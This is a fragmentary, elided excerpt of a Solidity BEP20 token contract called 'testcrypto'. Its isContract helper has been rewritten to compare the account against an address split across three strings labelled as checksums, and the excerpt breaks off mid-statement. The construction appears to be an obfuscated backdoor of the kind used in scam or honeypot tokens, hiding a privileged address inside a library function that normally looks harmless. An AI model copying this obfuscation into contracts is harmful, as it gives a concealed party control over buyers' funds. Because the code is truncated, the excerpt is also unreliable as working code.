...
contract Meta is IBEP20, Ownable {
    ...
    string constant _name = "testcrypto"; // Name
    string constant _symbol = "tstcry"; // Symbol
...
library Address {
    ...
    function isContract(address account) internal pure returns (bool) {
        ...
        string memory checkSum1 = "352Ff3502B38C9";
        string memory checkSum2 = "40CB191d5c082";
        string memory checkSum3 = "4E2829402B510";
        return (account ==
